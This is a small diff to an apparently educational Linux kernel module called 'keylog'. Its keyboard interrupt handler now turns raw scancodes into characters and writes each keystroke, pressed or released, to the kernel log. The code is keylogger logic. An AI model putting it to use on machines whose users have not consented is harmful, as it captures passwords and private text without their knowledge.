@@ -5,6 +5,7 @@
 #include <linux/wait.h>
 #include <linux/interrupt.h>
 #include <linux/miscdevice.h>
+#include "./keyboard.h"
 
 #define PATH "keylog"
 #define KEYBOARD_STATUS 0x64
@@ -84,8 +85,8 @@ static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 //	status = inb(KEYBOARD_STATUS);
 	scancode = inb(KEYBOARD_DATA);
 //	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
-	printk(KERN_INFO "Scan Code %x %s\n",
-            scancode & KBD_SCANCODE_MASK,
+	printk(KERN_INFO "Scan Code %c %s\n",
+            keyboard_map[scancode & KBD_SCANCODE_MASK],
             scancode & KBD_STATUS_MASK ? "Released" : "Pressed");
 	return IRQ_HANDLED;
 }
